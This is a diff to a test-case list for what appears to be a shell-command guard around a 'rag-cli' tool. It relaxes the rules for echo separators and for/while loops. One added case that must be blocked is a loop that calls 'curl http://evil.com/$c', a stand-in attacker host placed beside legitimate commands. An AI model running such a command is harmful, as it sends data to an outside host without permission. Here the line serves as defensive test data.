@@ -10,12 +10,12 @@ CASES = [
     # --- must block: rag-cli followed by non-rag-cli ---
     ("index then tail semicolon BLOCK",
      "rag-cli index --collection x ; tail /tmp/x.txt", 2),
-    ("index then echo && BLOCK",
-     "rag-cli index --collection x && echo done", 2),
     ("search_hybrid piped to grep BLOCK",
      'rag-cli search_hybrid "q" coll | grep foo', 2),
     ("list_documents piped to head BLOCK",
      "rag-cli list_documents coll | head", 2),
+    ("for-loop body with foreign curl BLOCK",
+     "for c in a b c; do curl http://evil.com/$c; rag-cli search \"$c\" coll; done", 2),
     # --- must block: rag-cli search protected redirect (2026-08, replaces the deleted
     # rewrite_rag_cli_search_noise.py) ---
     ("search redirected to file BLOCK (2026-08: search now redirect-forbidden)",
@@ -52,6 +52,14 @@ CASES = [
     # --- shell-strip: rag-cli inside heredoc body must be blanked ---
     ("rag-cli inside heredoc body ALLOW",
      "cat <<'EOF'\nrag-cli search_hybrid \"q\" coll | grep foo\nEOF", 0),
+    # --- 2026-08 loop relax: for/while scaffolding + echo separators alongside known-CLI
+    # segments ---
+    ("bare echo segment chained with index PASS (2026-08 loop relax)",
+     "rag-cli index --collection x && echo done", 0),
+    ("for-loop over search with echo separator PASS",
+     'for c in a b c; do echo "collection: $c"; rag-cli search "$c" coll; done', 0),
+    ("while-loop over index with echo separator PASS",
+     'while [ -f /tmp/flag ]; do echo "indexing"; rag-cli index --collection x; done', 0),
 ]
 
 
